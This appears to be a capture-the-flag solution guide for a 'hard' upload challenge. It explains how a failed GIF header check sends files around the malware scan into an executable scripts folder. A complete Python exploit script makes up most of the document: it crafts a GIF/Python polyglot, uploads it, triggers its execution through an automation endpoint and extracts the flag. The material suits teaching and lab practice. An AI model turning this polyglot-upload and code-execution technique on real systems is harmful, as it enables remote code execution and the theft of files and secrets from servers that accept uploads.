# A10 Hard Solution Guide: Image Container Exception Mishandling to RCE

### Vulnerability Analysis
1. **Pipeline Architecture:**
   - Files are validated first by `validate_image_header(data)`.
   - If valid, files proceed to `scan_malware(data)`.
   - If an `ImageHeaderError` exception occurs during header validation, the application catches the exception and executes a fallback routine that saves the file directly into `static/scripts/<filename>` without scanning for malware signatures.
2. **Polyglot Construction:**
   - Starting a file with `GIF89a = 1\n` matches the GIF header `GIF89a`.
   - Because the required Image Descriptor chunk (`0x2C`) is absent, `validate_image_header` raises `ImageHeaderError`.
   - The exception handler catches `ImageHeaderError`, skips `scan_malware`, and writes the file into `static/scripts/`.
   - `GIF89a = 1` is valid Python syntax, so the script executes without syntax errors.

---

### Exploit Script

```python
import re
import requests

BASE_URL = "http://127.0.0.1:6030"
s = requests.Session()

# 1. Craft polyglot payload: Valid GIF magic header + Valid Python code
payload = (
    b"GIF89a = 1\n"
    b"import os\n"
    b"flag_path = '/flag.txt' if os.path.exists('/flag.txt') else 'flag.txt'\n"
    b"try:\n"
    b"    with open(flag_path) as f:\n"
    b"        print('DYNAMIC_FLAG:' + f.read().strip())\n"
    b"except Exception:\n"
    b"    print('DYNAMIC_FLAG:' + os.environ.get('FLAG', ''))\n"
)

# 2. Upload exploit script
print("[*] Uploading GIF/Python polyglot payload to /media/upload...")
upload_resp = s.post(f"{BASE_URL}/media/upload", files={
    "asset_file": ("exploit.py", payload, "application/octet-stream")
})
assert upload_resp.status_code == 200
print("[+] ImageHeaderError triggered: Malware signature scan bypassed and script staged!")

# 3. Execute script in the Editorial Terminal
print("[*] Triggering script execution via /editorial/run-automation...")
run_resp = s.post(f"{BASE_URL}/editorial/run-automation", data={
    "script_name": "exploit.py"
}, allow_redirects=True)

# 4. Extract dynamic flag
flag_match = re.search(r"RTSA\{[^}]+\}", run_resp.text)
if flag_match:
    print(f"\n[+] SUCCESS! Captured Dynamic Flag: {flag_match.group(0)}")
else:
    print("[-] Flag not found in output:")
    print(run_resp.text)
```
